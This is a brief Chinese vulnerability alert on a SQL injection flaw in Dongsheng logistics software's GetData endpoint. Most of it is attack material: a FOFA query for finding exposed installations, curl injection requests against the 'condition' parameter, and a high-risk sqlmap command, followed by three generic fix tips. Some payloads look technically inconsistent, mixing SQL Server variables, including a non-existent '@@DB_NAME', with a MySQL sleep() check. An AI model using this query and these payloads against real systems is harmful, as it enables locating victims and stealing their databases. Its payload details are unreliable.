---
title: 【漏洞预警】东胜物流软件 GetData SQL注入漏洞
---

## 漏洞概述
东胜物流软件GetData接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句获取数据库敏感信息，甚至远程代码执行。

## 漏洞信息
| 属性 | 值 |
|------|-----|
| 漏洞名称 | 东胜物流软件GetData接口SQL注入漏洞 |
| 漏洞类型 | SQL注入 |
| 影响组件 | MsAnmoumce/GetData |
| 严重程度 | 高危 |

## FOFA查询
```
body="FeeCodes/CompanysAdapter.aspx"||body="dhtmlxcombo_whp.js"||body="dongshengsoft"||body="theme/dhtmlxcombo.css"
```

## POC
```bash
# 基础检测 - 获取数据库版本
curl "http://target/MvcShipping/MsAnmoumce/GetData?handle=edit&condition=1+<@@VERSION"

# 获取数据库名
curl "http://target/MvcShipping/MsAnmoumce/GetData?handle=edit&condition=1+<@@DB_NAME"

# 延时注入检测
curl "http://target/MvcShipping/MsAnmoumce/GetData?handle=edit&condition=1+and+sleep(5)--"
```

或使用sqlmap:
```bash
sqlmap -u "http://target/MvcShipping/MsAnmoumce/GetData?handle=edit&condition=1" --level=5 --risk=3
```

## 修复建议
1. 使用参数化查询
2. 实施严格输入验证
3. 升级到最新版本